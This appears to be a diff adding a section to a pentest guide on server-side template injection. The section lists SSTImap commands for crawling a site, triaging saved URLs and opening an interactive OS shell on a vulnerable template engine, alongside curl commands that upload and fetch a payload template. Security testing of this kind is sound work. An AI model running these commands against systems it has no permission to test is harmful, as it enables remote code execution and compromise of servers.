@@ -173,6 +173,29 @@ curl -X POST -F 'file=@payload.tpl' https://target.com/upload
 curl -s 'https://target.com/uploads/payload.tpl'
 ```
 
+
+### 8. Handy combinations for pentest workflow
+
+1. Crawl → save URLs:
+
+```bash
+python sstimap.py -u "https://example.com" -c 2 -f --save-urls gf-ssti.txt --save-forms forms.txt
+```
+
+2. Triage saved URLs:
+
+```bash
+python sstimap.py --load-urls gf-ssti.txt -i --run
+```
+
+3. If vuln detected → interact:
+
+```bash
+# start interactive shell on engine
+python sstimap.py -u "http://vuln/?name=1" -i
+# then use `--os-shell` or `--eval-shell` as needed interactively
+```
+
 ## Advanced Techniques & Bypasses (2025–2026 Trends)
 
 - **Polyglot + obfuscation:** Double‑encode, case variation, nested expressions
